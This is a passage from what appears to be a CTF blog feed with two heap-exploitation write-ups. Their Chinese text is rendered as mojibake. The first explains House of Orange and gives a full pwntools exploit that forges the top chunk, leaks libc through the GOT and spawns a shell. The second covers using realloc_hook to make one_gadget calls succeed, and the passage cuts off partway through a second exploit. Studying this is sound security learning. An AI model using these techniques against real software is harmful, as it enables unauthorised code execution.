class="hljs-name">old_top</span> == initial_top(<span class="hljs-name">av</span>) <span class="hljs-symbol">&amp;&amp;</span> old_size == <span class="hljs-number">0</span>) ||<br>     ((<span class="hljs-name">unsigned</span> long) (<span class="hljs-name">old_size</span>) &gt;= MINSIZE <span class="hljs-symbol">&amp;&amp;</span><br>      prev_inuse(<span class="hljs-name">old_top</span>) <span class="hljs-symbol">&amp;&amp;</span><br>      ((<span class="hljs-name">unsigned</span> long)old_end &amp; pagemask) == <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ£€æŸ¥äº† top chunk çš„åˆæ³•æ€§ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è°ƒç”¨æœ¬å‡½æ•°ï¼Œtop chunk å¯èƒ½æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥å¯èƒ½ old_size ä¸º 0ã€‚ å¦‚æœ top chunk å·²ç»åˆå§‹åŒ–äº†ï¼Œé‚£ä¹ˆ top chunk çš„å¤§å°å¿…é¡»å¤§äºç­‰äº MINSIZEï¼Œå› ä¸º top chunk ä¸­åŒ…å«äº† fencepostï¼Œæ‰€ä»¥ top chunk çš„å¤§å°å¿…é¡»è¦å¤§äº MINSIZEã€‚å…¶æ¬¡ top chunk å¿…é¡»æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œå¹¶ä¸” top chunk çš„ç»“æŸåœ°å€å¿…å®šæ˜¯é¡µå¯¹é½çš„ã€‚æ­¤å¤– top chunk é™¤å» fencepost çš„å¤§å°å¿…å®šè¦å°äºæ‰€éœ€ chunk çš„å¤§å°ï¼Œå¦åˆ™åœ¨_int_malloc() å‡½æ•°ä¸­ä¼šä½¿ç”¨ top chunk åˆ†å‰²å‡º chunkã€‚</p><p>æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹ä¼ªé€ çš„ top chunk size çš„è¦æ±‚</p><ol><li>ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ</li><li>size è¦å¤§äº MINSIZE(0x10)</li><li>size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10)</li><li>size çš„ prev inuse ä½å¿…é¡»ä¸º 1</li></ol><p>ä¹‹ååŸæœ‰çš„ top chunk å°±ä¼šæ‰§è¡Œ<code>_int_free</code>ä»è€Œé¡ºåˆ©è¿›å…¥ unsorted bin ä¸­ã€‚</p><p>æ³¨æ„äº‹é¡¹ï¼šä¼ªé€ çš„top_chunkè¦é¡µå¯¹é½ï¼Œå½“top_chunkç¬¦åˆé¡µå¯¹é½ï¼Œä¸”å¤§å°å°äº0x90æ—¶ï¼Œå½“ç”³è¯·æ¯”top_chunkå¤§çš„å †æ˜¯ï¼Œé‡Šæ”¾çš„top_chunkä¼šè¿›å…¥fastbinsï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚è¿›è¡Œfastbinsæ”»å‡»ï¼Œæ”¾å…¥è¿™ä¸ªfastbinsçš„chunkçš„å¤§å°ä¸ºï¼štop_chunk - 0x20</p><p>æ‰€ä»¥æˆ‘ä»¬å¯èƒ½æ ¹æ®æƒ…å†µè¿›è¡Œunsorted binæ”»å‡»æˆ–è€…è¿›è¡Œfast binæ”»å‡»</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/House_of_Orange">ä¾‹é¢˜ä¸‹è½½</a></p><p>æŸ¥çœ‹ä¿æŠ¤ ï¼Œæ²¡æœ‰å¼€å¯pieå’Œgotå†™å…¥ä¿æŠ¤</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122055569.png" alt="æŸ¥çœ‹ä¿æŠ¤"></p><p>idaåç¼–è¯‘å‘ç°æ²¡æœ‰freeå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122056645.png" alt="idaåç¼–è¯‘"></p><p>æƒ³åˆ°ç”¨House of Orange</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122057567.png" alt="editå‡½æ•°"></p><p>å‘ç°ç¼–è¾‘å‡½æ•°å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥æ§åˆ¶chunkå¤´å’ŒchunkæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨fastbinæ”»å‡»</p><p>æ”»å‡»æµç¨‹ï¼š</p><ol><li>ä¼ªé€ top_chunkï¼ˆç¡®ä¿é¡µå¯¹é½ï¼‰</li><li>ç„¶åç”³è¯·å †ç©ºé—´ï¼Œä½¿top_chunkå‰©ä½™0x90å¤§å°</li><li>ç”³è¯·å¤§äºtop_chunkå¤§å°çš„å †ç©ºé—´ï¼Œæ­¤æ—¶top_chunkè¿›å…¥fastbin</li><li>é€šè¿‡å †æº¢å‡ºï¼Œä¿®æ”¹fastbinçš„fdæŒ‡é’ˆï¼Œè¿›è¡Œfastbinæ”»å‡»</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x0000000000400A9C</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.ADD PAGE</span><br><span class="hljs-string">2.EDIT PAGE</span><br><span class="hljs-string">3.SHOW PAGE</span><br><span class="hljs-string">4.EXIT</span><br><span class="hljs-string">input your chioce:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0xfe1</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0xf40</span> , <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x90</span> , <span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br>fake_chunk = <span class="hljs-number">0x60208d</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf48</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xa3</span> + p64(puts_got)<br>edit(<span class="hljs-number">4</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-built_in">hex</span>(leak_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span> , leak_addr)<br>base_addr = leak_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4525a</span> , <span class="hljs-number">0xef9f4</span> , <span class="hljs-number">0xf0897</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">2</span>]<br><br>payload = p64(execve)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Orange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é€šè¿‡ realloc_hook è°ƒæ•´æ ˆå¸§ä½¿ onegadget ç”Ÿæ•ˆ</title>
    <link href="/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/"/>
    <url>/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æŸäº›å †çš„é¢˜ç›®å½“ä¸­ï¼Œç”±äºé™åˆ¶åªèƒ½ä½¿ç”¨ house of spirit ç­‰æ–¹æ³•åŠ«æŒ malloc_hook ï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯å¾€ malloc_hook å†™å…¥ onegadget ï¼Œå†æ¬¡ç”³è¯·å †æ¥ getshell ã€‚</p><p>ç”±äºæ ˆå¸§æƒ…å†µä¸æ»¡è¶³ï¼ŒæŸ¥è¯¢åˆ°çš„æ‰€æœ‰ onegadget å¯èƒ½éƒ½æ‰“ä¸é€šï¼Œè¿™æ—¶å°±å¯ä»¥è€ƒè™‘ä¸‹ç”¨ malloc_hook å’Œ realloc_hook ç»“åˆã€‚å…ˆé€šè¿‡ reallocè°ƒæ•´æ ˆå¸§ï¼Œç„¶ååœ¨è¿è¡Œ onegadget ã€‚</p><h2 id="äº†è§£-realloc"><a href="#äº†è§£-realloc" class="headerlink" title="äº†è§£ realloc"></a>äº†è§£ realloc</h2><p>realloc åœ¨åº“å‡½æ•°ä¸­çš„ä½œç”¨æ˜¯é‡æ–°è°ƒæ•´ malloc æˆ– calloc æ‰€åˆ†é…çš„å †å¤§å°ã€‚å®ƒå’Œ malloc å‡½æ•°ä¸€æ ·æœ‰ hook å‡½æ•°ï¼Œå½“ hook å‡½æ•°ä¸ä¸ºç©ºæ—¶ï¼Œå°±ä¼šè·³è½¬è¿è¡Œ hook å‡½æ•°ï¼ˆå’Œ malloc_hook ä¸€æ ·çš„ï¼‰ï¼Œå…¶ä¸­realloc_hookåœ¨malloc_hook - 0x08çš„ä½ç½®ã€‚</p><p>çœ‹çœ‹ realloc çš„æ±‡ç¼–ä»£ç ï¼šï¼ˆå¯ä»¥æŠŠ libc æ‹–åˆ° ida ä¸­çœ‹ï¼Œä¹Ÿå¯ä»¥æ³„éœ²åœ°å€å gdb è°ƒè¯•æŸ¥çœ‹ <code>x /20i [addr]</code>ï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>00000000000846C0 realloc         proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: LOAD:0000000000006BA0â†‘o</span><br><span class="hljs-symbol">.text:</span>00000000000846C0 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>00000000000846C0                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span>             <span class="hljs-comment">; Alternative name is &#x27;__libc_realloc&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000846C2                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span>00000000000846C4                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span>00000000000846C6                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span>00000000000846C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846CB                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000846CC                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000846CD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000846D0                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>00000000000846D4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:__realloc_hook_ptr<br><span class="hljs-symbol">.text:</span>00000000000846<span class="hljs-built_in">DB</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000846DE                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>00000000000846E1                 <span class="hljs-keyword">jnz</span>     loc_848E8  <span class="hljs-comment">; è·³è½¬æ‰§è¡Œ realloc_hook</span><br><span class="hljs-symbol">.text:</span>00000000000846E7                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846EA                 <span class="hljs-keyword">jnz</span>     short loc_846F5<br><span class="hljs-symbol">.text:</span>00000000000846EC                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000846EF                 <span class="hljs-keyword">jnz</span>     loc_84960<br></code></pre></td></tr></table></figure><p>å‡½æ•°ä¸€å¼€å§‹æœ‰å¾ˆå¤šçš„ push ï¼Œrealloc å‡½æ•°å…ˆæ‰§è¡Œ push å‹æ ˆï¼Œç„¶ååœ¨è·³è½¬æ‰§è¡Œ realloc_hook å­˜å‚¨çš„å‡½æ•°ã€‚æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™äº› push è°ƒæ•´æ ˆå¸§ã€‚push çš„æ•°é‡å‘ç”Ÿå˜åŒ–ä¼šå½±å“ rsp çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶ rsp çš„å–å€¼ï¼Œä»è€Œæ»¡è¶³ onegadget çš„æ‰§è¡Œæ¡ä»¶ã€‚é™¤äº†å¯ä»¥æ§åˆ¶ push æ•°é‡ï¼Œè¿˜èƒ½é€šè¿‡åç§»å¾—åˆ°å…¶ä»–çš„ <code>push xxx</code> ã€‚</p><h3 id="malloc-hook-ä¸-realloc-hook-é…åˆ"><a href="#malloc-hook-ä¸-realloc-hook-é…åˆ" class="headerlink" title="malloc_hook ä¸ realloc_hook é…åˆ"></a>malloc_hook ä¸ realloc_hook é…åˆ</h3><p>å°† malloc_hook åŠ«æŒä¸º realloc ï¼Œrealloc_hook åŠ«æŒä¸º onegadget ï¼Œå®é™…è¿è¡Œé¡ºåºï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">malloc_hook</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc_hook</span> -&gt;</span> onegadget<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ç»è¿‡ realloc è°ƒæ•´æ ˆå¸§åå†è¿è¡Œ onegadget ã€‚å®é™…æƒ…å†µä¸­ï¼Œå¹¶ä¸æ˜¯ç›´æ¥åŠ«æŒ malloc_hook ä¸º realloc ï¼Œè€Œæ˜¯è¦åŠ ä¸Šä¸€å®šçš„åç§»ï¼Œä¹Ÿå°±æ˜¯è°ƒæ•´ push çš„æ•°é‡ï¼Œè®©æ ˆå¸§ç»“æ„æ»¡è¶³ onegadget è¿è¡Œã€‚</p><p>realloc è¿™ä¸ªåç§»åšé¢˜è¿˜æ˜¯é€ä¸ªè¯•æ„Ÿè§‰å¿«ä¸€ç‚¹ï¼Œå› ä¸ºè®¾æƒ³æ˜¯<strong>å°‘ä¸€ä¸ª push ï¼Œrsp å°±ä¼šå‘å‰ç§»åŠ¨ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå¯¹åº”çš„</strong> <strong><code>[rsp+0x30]=[rsp+0x38]</code></strong> ï¼Œä½†å®é™…ä¸Šæœ‰å°‘éƒ¨åˆ†ä½ç½®å¯èƒ½è¢«å…¶ä»–ä¸œè¥¿å†™å…¥æ”¹å˜äº†åŸæ¥çš„å€¼ã€‚è‡ªè¡Œè°ƒè¯•ä½“ä¼šä¸€ä¸‹ï¼š</p><p>åŸç†ä¸Šæ˜¯ï¼š<strong>å°‘ä¸€ä¸ª push ï¼Œrsp å°±ä¼šå‘å‰ç§»åŠ¨ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå¯¹åº”çš„</strong> **<code>[rsp+0x30]=[rsp+0x38]</code>**ï¼Œä½†å®é™…éƒ¨åˆ†ä½ç½®çš„å€¼ä¼šå˜ï¼Œæ‰€ä»¥é€ä¸ªè¯•ï¼Œé€Ÿåº¦å¯èƒ½æ¯”è®¡ç®—å¿«ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/roarctf_2019_easy_pwn">é™„ä»¶</a></p><p>å‰è¾¹å°±æ˜¯æ­£å¸¸çš„æ‰“hook</p><p>ä½†æ˜¯æ‰€ä»¥çš„onegadgetéƒ½ä¸èƒ½ç”¨ï¼Œå°±è¦æƒ³åˆ°ç”¨malloc_hook ä¸ realloc_hook é…åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>url = <span class="hljs-string">&#x27;node5.buuoj.cn:26271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> 